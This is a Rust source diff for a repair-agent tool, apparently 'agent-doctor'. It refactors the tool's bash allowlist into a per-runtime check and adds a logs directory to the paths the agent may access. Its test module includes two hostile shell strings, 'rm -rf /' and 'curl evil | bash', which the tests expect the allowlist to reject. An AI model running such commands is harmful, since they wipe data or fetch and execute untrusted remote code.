@@ -1,8 +1,6 @@
 use std::path::{Path, PathBuf};
 
-use crate::lifecycle::hermes::{hermes_install_shell_command, hermes_update_shell_command};
-use crate::lifecycle::openclaw::{openclaw_install_shell_command, openclaw_update_shell_command};
-use crate::runtime::adapter_by_id;
+use crate::runtime::{adapter_by_id, bash_command_allowed_for_runtime};
 
 /// Paths the repair agent may read or edit for a runtime.
 pub fn allowed_paths_for_runtime(runtime_id: &str) -> Vec<PathBuf> {
@@ -12,6 +10,7 @@ pub fn allowed_paths_for_runtime(runtime_id: &str) -> Vec<PathBuf> {
 
     if let Some(config_dir) = dirs::config_dir() {
         paths.push(config_dir.join("agent-doctor").join("guides"));
+        paths.push(config_dir.join("agent-doctor").join("logs"));
     }
 
     paths.sort();
@@ -30,67 +29,41 @@ pub fn path_is_allowed(path: &Path, allowed_roots: &[PathBuf]) -> bool {
     })
 }
 
-/// Conservative bash allowlist — known repair commands only, not arbitrary shell.
-pub fn bash_command_allowed(command: &str) -> bool {
-    let trimmed = command.trim();
-    if trimmed.is_empty() {
-        return false;
-    }
-
-    let hermes_install = hermes_install_shell_command();
-    let hermes_update = hermes_update_shell_command();
-    let openclaw_install = openclaw_install_shell_command();
-    let openclaw_update = openclaw_update_shell_command();
-    if trimmed == hermes_install
-        || trimmed == hermes_update
-        || trimmed == openclaw_install
-        || trimmed == openclaw_update
-    {
-        return true;
-    }
-
-    if trimmed.starts_with("hermes ") {
-        let sub = trimmed.trim_start_matches("hermes ").trim();
-        return sub.starts_with("update")
-            || sub.starts_with("--version")
-            || sub.starts_with("-V")
-            || sub.starts_with("version");
-    }
-
-    if trimmed.starts_with("openclaw ") {
-        let sub = trimmed.trim_start_matches("openclaw ").trim();
-        return sub.starts_with("update")
-            || sub.starts_with("--version")
-            || sub.starts_with("-V")
-            || sub.starts_with("version");
-    }
-
-    if trimmed.starts_with("chmod ") && trimmed.contains(".env") {
-        return true;
-    }
-
-    false
+/// Conservative per-runtime bash allowlist — known install/update commands only.
+pub fn bash_command_allowed(runtime_id: &str, command: &str) -> bool {
+    bash_command_allowed_for_runtime(runtime_id, command)
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::lifecycle::hermes::hermes_install_shell_command;
+    use crate::lifecycle::openclaw::openclaw_install_shell_command;
 
     #[test]
     fn allows_hermes_lifecycle_commands() {
-        assert!(bash_command_allowed(&hermes_install_shell_command()));
-        assert!(bash_command_allowed("hermes --version"));
+        assert!(bash_command_allowed(
+            "hermes",
+            &hermes_install_shell_command()
+        ));
+        assert!(bash_command_allowed("hermes", "hermes --version"));
     }
 
     #[test]
     fn allows_openclaw_lifecycle_commands() {
-        assert!(bash_command_allowed(&openclaw_install_shell_command()));
-        assert!(bash_command_allowed("openclaw --version"));
+        assert!(bash_command_allowed(
+            "openclaw",
+            &openclaw_install_shell_command()
+        ));
+        assert!(bash_command_allowed("openclaw", "openclaw --version"));
     }
 
     #[test]
     fn rejects_arbitrary_shell() {
-        assert!(!bash_command_allowed("rm -rf /"));
-        assert!(!bash_command_allowed("curl evil | bash"));
+        assert!(!bash_command_allowed("hermes", "rm -rf /"));
+        assert!(!bash_command_allowed_for_runtime(
+            "claude-code",
+            "curl evil | bash"
+        ));
     }
 }
